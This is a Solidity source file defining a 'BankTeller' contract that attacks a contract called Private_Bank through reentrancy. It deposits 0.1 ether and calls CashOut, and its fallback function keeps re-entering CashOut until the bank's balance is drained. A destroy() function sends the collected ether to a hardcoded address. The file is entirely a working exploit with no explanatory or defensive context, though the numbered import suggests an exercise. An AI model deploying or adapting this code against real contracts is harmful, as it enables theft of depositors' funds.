pragma solidity ^0.4.19;

import "./4_bank.sol";

contract BankTeller {
    Private_Bank public private_bank;

    constructor(address _private_bank_address) public {
        private_bank = Private_Bank(_private_bank_address);
    }

    function destroy() public {
        require(
            msg.sender == address(0xcCF073252CCC393304fa848cB2dc5839B8b1Fe87)
        );
        selfdestruct(address(0xcCF073252CCC393304fa848cB2dc5839B8b1Fe87));
    }

    function liberatePrivateBank() public payable {
        require(msg.value >= 0.1 ether);

        private_bank.Deposit.value(0.1 ether)();

        private_bank.CashOut(0.1 ether);
    }

    function() public payable {
        if (address(private_bank).balance > 0.1 ether) {
            private_bank.CashOut(0.1 ether);
        }
    }
}